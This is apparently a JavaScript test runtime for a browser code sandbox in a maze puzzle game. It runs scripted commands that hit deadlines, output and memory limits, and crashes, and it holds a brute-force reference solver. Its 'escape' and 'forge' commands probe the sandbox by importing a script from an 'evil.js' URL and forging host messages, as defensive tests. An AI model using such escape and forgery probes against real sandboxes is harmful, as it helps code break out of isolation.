/*
 * Ink Maze level 26: the 'echo' test runtime.
 *
 * Not a language. It proves the sandbox plumbing end to end (load, run,
 * output, the cooperative deadline, the output and memory limits, children,
 * lockdown, crashes) without a toolchain, and gives
 * scripts/test-inkmaze-code-sandbox.mjs a runtime it can drive in Chromium
 * and WebKit. It also shows the shape every real runtime has: load(host),
 * then run(job, io) that compiles, calls io.started(), runs a harness that
 * follows problem.ts H1-H6, checks io.check() in every loop, and returns a
 * RuntimeOutcome. The UI never lists it.
 *
 * The "source" is a tiny script, one command per line:
 *   solve                 answer every board with a real brute force (the reference)
 *   answer <moves>        print one answer line with these moves
 *   answer-each <moves>   print that answer once per board
 *   exit-early            answer one board fewer than asked and finish 'ok' (the page: crashed)
 *   print <text>          print a line to the console (stdout)
 *   print-json <json>     print a JSON string as is, no line break added
 *   warn <text>           print a line to stderr
 *   stdin                 print the job's stdin to the console
 *   sleep <ms>            busy-wait that long, calling io.check() throughout
 *   spin                  loop forever, calling io.check() (-> time_limit, stopped by the runtime)
 *   spin-catch            like spin, but swallows the first LimitError (the sticky check stops it anyway)
 *   spin-hot              loop forever WITHOUT io.check() (-> the host's terminate(); JavaScript stops,
 *                         in Chromium only after its ~2 s forcible-termination delay)
 *   spin-wasm             a WebAssembly loop that calls io.check() every 65,536 turns
 *   spin-wasm-hot         a WebAssembly loop with no check at all (the WebKit runaway: it keeps a
 *                         core busy after terminate(); the test's positive control)
 *   compile-spin          spin with checks before io.started() (-> time_limit while compiling)
 *   clock-tamper          replace performance.now and Date.now, then spin (the private clock still stops it)
 *   flood                 print forever (-> output_limit)
 *   grow                  allocate 16 MiB blocks until past the heap limit (-> memory_limit)
 *   throw <message>       report a runtime_error on the current board
 *   crash <message>       let run() throw a plain Error (-> crashed)
 *   compile-error <msg>   fail before io.started() (-> compile_error, line 1)
 *   fake-answer <moves>   print the answer marker itself (-> crashed: too many answers)
 *   close                 call close() on the worker (-> crashed)
 *   return <status>       resolve run() with this status
 *   unhealthy             finish 'ok' but ask for a fresh worker
 *   escape                print which network / storage / messaging globals are still reachable
 *   forge                 try to post forged messages and dispatch forged events
 *   spawn-echo            start a child with host.spawn(), send it a message, print its reply
 *   spawn-spin            start a child that spins in JavaScript, checking the parent's deadlineEpochMs (D8)
 *   spawn-spin-hot        start a child that spins in JavaScript with no check (only terminate() stops it)
 *   spawn-spin-wasm       start a child that spins in WebAssembly, checking the parent's deadlineEpochMs
 * (each spawn-spin* then spins in the parent too, with checks, until the limit)
 * A blank source answers every board with an empty string (the 'empty' verdict).
 */

const MARKER = '@@ANSWER@@'
// (module (import "env" "check" (func)) (func (export "spin") (local i32)
//   (loop (if (i32.eqz (i32.and (local.tee 0 (i32.add (local.get 0) (i32.const 1))) (i32.const 65535))) (then (call 0))) (br 0))))
const WASM_COOPERATIVE = [0, 0x61, 0x73, 0x6d, 1, 0, 0, 0, 1, 4, 1, 0x60, 0, 0, 2, 0x0d, 1, 3, 0x65, 0x6e, 0x76, 5, 0x63, 0x68, 0x65, 0x63, 0x6b, 0, 0,
  3, 2, 1, 0, 7, 8, 1, 4, 0x73, 0x70, 0x69, 0x6e, 0, 1, 0x0a, 0x1d, 1, 0x1b, 1, 1, 0x7f, 3, 0x40, 0x20, 0, 0x41, 1, 0x6a, 0x22, 0,
  0x41, 0xff, 0xff, 3, 0x71, 0x45, 4, 0x40, 0x10, 0, 0x0b, 0x0c, 0, 0x0b, 0x0b]
// (module (func (export "spin") (loop (br 0))))
const WASM_HOT = [0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 8, 1, 4, 115, 112, 105, 110, 0, 0, 10, 9, 1, 7, 0, 3, 64, 12, 0, 11, 11]

/** H3's escaping (problem.ts escapeAnswer), as every harness does it. Exported for the Node test. */
export function escapeAnswer(moves, max) {
  let out = ''
  for (let i = 0; i < moves.length && out.length < max; i++) {
    const code = moves.charCodeAt(i)
    if (code < 0x20) out += String.fromCharCode(0x2400 + code)
    else if (code === 0x7f) out += '␡'
    else if (code === 0x40) out += '＠' // '@': an answer can never hold the marker
    else if (code >= 0xd800 && code <= 0xdbff) {
      const low = moves.charCodeAt(i + 1)
      if (low >= 0xdc00 && low <= 0xdfff) { out += moves[i] + moves[i + 1]; i++ } else out += '�'
    } else if (code >= 0xdc00 && code <= 0xdfff) out += '�'
    else out += moves[i]
  }
  return out.slice(0, max)
}

/** H1: read every board of stdin first. */
function readBoards(stdin) {
  const lines = stdin.split('\n')
  const boards = []
  let at = 1
  for (let t = 0; t < Number(lines[0]); t++) {
    const [h, , ink] = lines[at].split(' ').map(Number)
    boards.push({ grid: lines.slice(at + 1, at + 1 + h), ink })
    at += 1 + h
  }
  return boards
}

/** The reference: a depth-first search that prunes when the ink left is less than the blocks left. */
function solveBoard(grid, ink, io) {
  const rows = grid.length
  const cols = grid[0].length
  const colored = grid.map((row) => [...row].map((c) => c === 'o'))
  let floors = 0
  let r0 = 0
  let c0 = 0
  grid.forEach((row, r) => [...row].forEach((ch, c) => { if (ch !== '#') floors++; if (ch === 'o') { r0 = r; c0 = c } }))
  const moves = []
  let calls = 0
  const dfs = (r, c, count, left) => {
    if ((++calls & 4095) === 0) io.check()
    if (count === floors) return true
    if (left <= 0 || left < floors - count) return false
    for (const [name, dr, dc] of [['U', -1, 0], ['D', 1, 0], ['L', 0, -1], ['R', 0, 1]]) {
      let nr = r + dr
      let nc = c + dc
      if (nr < 0 || nc < 0 || nr >= rows || nc >= cols || grid[nr][nc] === '#') continue
      const painted = []
      let spent = 0
      let er = r
      let ec = c
      while (nr >= 0 && nc >= 0 && nr < rows && nc < cols && grid[nr][nc] !== '#' && spent < left) {
        if (!colored[nr][nc]) { colored[nr][nc] = true; painted.push(nr * cols + nc) }
        spent++
        er = nr
        ec = nc
        nr += dr
        nc += dc
      }
      moves.push(name)
      if (dfs(er, ec, count + painted.length, left - spent)) return true
      moves.pop()
      for (const p of painted) colored[Math.floor(p / cols)][p % cols] = false
    }
    return false
  }
  return dfs(r0, c0, 1, ink) ? moves.join('') : ''
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms))

const RUNTIME = {
  id: 'echo',
  version: 'echo test runtime 1',
  host: null,

  async load(host) {
    this.host = host
    host.progress('Starting the echo runtime', 1, 2)
    // a real runtime fetches its toolchain here; echo checks that the asset path works
    const self = await host.assetText('echo/runtime.js')
    if (!self.includes('echo test runtime')) throw new Error('the asset channel returned the wrong file')
    // echo runs JavaScript in this worker, so it locks the worker down like a native JS runner would
    host.lockdown()
    host.progress('Starting the echo runtime', 2, 2)
    return { version: this.version, engine: 'echo' }
  },

  async run(job, io) {
    const lines = job.source.split('\n').map((l) => l.trim()).filter((l) => l.length && !l.startsWith('#'))
    // "compiling"
    for (const line of lines) {
      io.check()
      if (line.startsWith('compile-error')) {
        return { status: 'compile_error', diagnostics: [{ line: 1 + job.source.split('\n').findIndex((l) => l.trim().startsWith('compile-error')), column: 1, severity: 'error', message: line.slice('compile-error'.length).trim() || 'echo compile error' }] }
      }
      if (line === 'compile-spin') for (;;) io.check()
    }
    io.started() // the time limit starts here (D1)

    const boards = readBoards(job.stdin) // H1
    let answered = 0
    const answer = (moves) => { io.stdout(`${MARKER} ${escapeAnswer(moves, job.answerChars)}\n`); answered++ }

    for (const line of lines) {
      io.check()
      const space = line.indexOf(' ')
      const cmd = space < 0 ? line : line.slice(0, space)
      const arg = space < 0 ? '' : line.slice(space + 1)
      switch (cmd) {
        case 'solve':
          for (const board of boards.slice(answered)) answer(solveBoard([...board.grid], board.ink, io))
          break
        case 'answer': answer(arg); break
        case 'answer-each': while (answered < job.tests) answer(arg); break
        case 'exit-early': while (answered < job.tests - 1) answer(''); return { status: 'ok' }
        case 'print': io.stdout(`${arg}\n`); break
        case 'print-json': io.stdout(JSON.parse(arg)); break
        case 'warn': io.stderr(`${arg}\n`); break
        case 'stdin': io.stdout(job.stdin); break
        case 'sleep': { const until = io.now() + Number(arg || 0); while (io.now() < until) io.check(); break }
        case 'spin': for (;;) io.check()
        case 'spin-catch': {
          try { for (;;) io.check() } catch { /* swallowed (printing would throw too: output is refused once a limit is hit) */ }
          for (;;) io.check() // sticky: throws again at once
        }
        case 'spin-hot': for (;;) { /* no check: the host's backstop, and terminate() stops JavaScript */ }
        case 'spin-wasm': {
          const inst = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array(WASM_COOPERATIVE)), { env: { check: () => io.check() } })
          inst.exports.spin()
          break
        }
        case 'spin-wasm-hot': {
          const inst = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array(WASM_HOT)), {})
          inst.exports.spin()
          break
        }
        case 'clock-tamper': {
          performance.now = () => 0
          Date.now = () => 0
          for (;;) io.check()
        }
        case 'flood': for (;;) io.stdout('flooding the console with text\n')
        case 'grow': {
          const blocks = []
          for (;;) {
            io.check()
            if ((blocks.length + 1) * 16 * 1024 * 1024 > job.memoryLimitBytes) { io.hit('memory_limit', 'Your code asked for more than ' + (job.memoryLimitBytes >> 20) + ' MiB.'); io.check() }
            blocks.push(new Uint8Array(16 * 1024 * 1024).fill(1))
          }
        }
        case 'throw': return { status: 'runtime_error', message: `Runtime error on board ${answered + 1}: ${arg || 'echo threw'}`, error: { type: 'EchoError', message: arg || 'echo threw', line: 1, column: null, test: answered } }
        case 'crash': throw new Error(arg || 'echo crashed')
        case 'fake-answer': io.stdout(`${MARKER} ${arg}\n`); break
        case 'close': self.close(); break
        case 'return': return { status: arg || 'crashed' }
        case 'unhealthy': while (answered < job.tests) answer(''); return { status: 'ok', healthy: false }
        case 'escape': {
          const names = ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'importScripts', 'Worker', 'SharedWorker', 'BroadcastChannel', 'indexedDB', 'caches', 'postMessage', 'localStorage', 'sessionStorage']
          const reachable = names.filter((n) => { try { return typeof self[n] !== 'undefined' && self[n] !== null } catch { return false } })
          const proto = names.filter((n) => { try { for (let p = Object.getPrototypeOf(self); p; p = Object.getPrototypeOf(p)) if (Object.prototype.hasOwnProperty.call(p, n) && p[n]) return true } catch { /* ignore */ } return false })
          let imported = 'blocked'
          try { await import('https://example.com/evil.js'); imported = 'loaded' } catch { /* the CSP refuses it */ }
          io.stdout(`reachable: ${reachable.join(',') || 'none'}\nprototype: ${proto.join(',') || 'none'}\nimport: ${imported}\n`)
          break
        }
        case 'forge': {
          let attempts = 0
          try { self.postMessage({ type: 'done', runId: job.runId, outcome: { status: 'ok' } }); attempts++ } catch { /* gone */ }
          for (let p = Object.getPrototypeOf(self); p; p = Object.getPrototypeOf(p)) {
            const fn = Object.getOwnPropertyDescriptor(p, 'postMessage')?.value
            if (typeof fn === 'function') { try { fn.call(self, { type: 'done', runId: job.runId, outcome: { status: 'ok' } }); attempts++ } catch { /* ignore */ } }
          }
          self.dispatchEvent(new MessageEvent('message', { data: { type: 'dispose' } }))
          self.dispatchEvent(new MessageEvent('message', { data: { type: 'run', job: { ...job, runId: 'forged' } } }))
          io.stdout(`forged posts that went through: ${attempts}\n`)
          break
        }
        case 'spawn-echo': {
          const child = await this.spawnChild()
          const reply = await new Promise((resolve) => { child.port.onmessage = (e) => resolve(e.data); child.port.postMessage({ cmd: 'echo', text: arg || 'hello' }) })
          io.stdout(`${reply.reply} (protocol ${reply.protocol}, child fetch: ${reply.hasFetch})\n`)
          child.terminate()
          break
        }
        case 'spawn-spin':
        case 'spawn-spin-hot':
        case 'spawn-spin-wasm': {
          const child = await this.spawnChild()
          await new Promise((resolve) => {
            child.port.onmessage = (e) => { if (e.data.spinning) resolve() }
            const command = { 'spawn-spin': 'spin', 'spawn-spin-hot': 'spin-hot', 'spawn-spin-wasm': 'spin-wasm' }[cmd]
            child.port.postMessage({ cmd: command, wasm: WASM_COOPERATIVE, deadlineEpochMs: io.deadlineEpochMs })
          })
          io.stdout('the child is spinning\n')
          // the child is left running on purpose: the host must stop it with this worker
          for (;;) { io.check(); await sleep(5) }
        }
        default: io.stderr(`echo: unknown command '${cmd}'\n`); break
      }
    }
    // H3: every board gets an answer line; boards the script did not answer get an empty one
    while (answered < job.tests) answer('')
    return { status: 'ok' }
  },

  /** D8: a child thread, made and owned by the host (echo/child.js) */
  spawnChild() {
    return this.host.spawn('echo/child.js')
  },

  footprint() { return { memoryBytes: 1 << 20 } },
}

export default RUNTIME
